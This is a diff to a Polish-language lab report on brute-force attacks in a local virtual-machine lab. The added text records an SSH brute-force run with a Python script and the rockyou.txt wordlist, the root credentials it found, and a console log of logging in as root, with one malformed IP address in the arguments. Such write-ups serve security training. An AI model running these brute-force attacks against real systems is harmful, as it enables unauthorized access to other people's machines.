@@ -73,6 +73,7 @@ ___
 
 ## Atak brute-force na dowolną usługę
 
+### SSH brute-force
 W pierwszej kolejności przeprowadzono atak na port 22 i usługę SSH. Założono, że na atakowanej maszynie istnieje użytkownik 'root'. Słownik możliwych haseł: rockyou.txt\
 **Skrypt**: [brute_force_ssh_final.py](brute_force_ssh_final.py) wywołany z argumentami:
 - --host 192.168.100.56.106
@@ -94,3 +95,41 @@ kali@kali:~$ python brute_force_ssh_final.py --host 192.168.56.106 --user root -
         Hasło: 666
 
 ```
+W wyniku działania skryptu zdobyto następujące poświadczenia:\
+- użytkownik: **root**
+- hasło: **666**
+
+Potwierdzenie poprawności danych uzyskano poprzez próbę bezpośredniego połączenia z atakowaną maszyną:
+```console
+kali@kali:~$ ssh root@192.168.56.106                        
+The authenticity of host '192.168.56.106 (192.168.56.106)' can't be established.
+ED25519 key fingerprint is SHA256:Oh4jSTvEH3MOWXJ6sWf6a1CebgOAgf5dvE9hDmmM8CU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.106' (ED25519) to the list of known hosts.
+root@192.168.56.106's password: 
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-47-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Sep 15 08:46:52 AM UTC 2022
+
+  System load:  0.0               Processes:               136
+  Usage of /:   38.2% of 9.75GB   Users logged in:         0
+  Memory usage: 7%                IPv4 address for enp0s3: 192.168.56.106
+  Swap usage:   0%
+
+
+46 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Fri Sep  9 06:12:02 2022 from 192.168.100.54
+root@vm-sda:~# 
+
+```
+Na tym etapie porzucono eksploarację przejętej maszyny, celem podjęcia kolejnych prób brute-force.
+
+### FTP Brute-force
